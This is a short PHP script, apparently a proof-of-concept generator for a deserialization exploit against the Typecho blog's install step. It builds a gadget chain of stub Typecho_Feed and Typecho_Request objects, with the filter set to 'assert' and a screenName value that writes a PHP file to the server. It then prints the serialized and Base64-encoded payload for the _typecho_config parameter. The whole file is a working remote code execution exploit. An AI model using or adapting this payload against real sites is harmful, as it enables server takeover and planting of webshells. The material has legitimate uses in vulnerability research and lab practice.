<?php 
/** 
* Created by PhpStorm. 
* User: RaI4over 
* Date: 2017/10/19 
* Time: 15:17 
* 生成 _typecho_config 的值 
*/ 
class Typecho_Feed{ 

	const RSS2 = 'RSS 2.0'; 
	private $_type; 
	private $_charset; 
	private $_lang; 
	private $_items = array(); 
	public function __construct($version, $type = self::RSS2, $charset = 'UTF-8', $lang = 'en'){ 
		$this->_version = $version; 
		$this->_type = $type; 
		$this->_charset = $charset; 
		$this->_lang = $lang; 
	}

	public function addItem(array $item){ 
		$this->_items[] = $item; 
	} 
} 

class Typecho_Request{ 
	private $_params = array('screenName'=>'fputs(fopen(\'./test.php\',\'w\'),\'<?php echo 1113342;?>\')'); 
	private $_filter = array('assert'); 
}
$payload1 = new Typecho_Feed(5, 'ATOM 1.0'); 
$payload2 = new Typecho_Request(); 
$payload1->addItem(array('author' => $payload2)); 
$exp['adapter'] = $payload1;
$exp['prefix'] = 'test';
echo "序列化: ".serialize($exp)."<br><br>";
echo "Base64编码".base64_encode(serialize($exp)); 
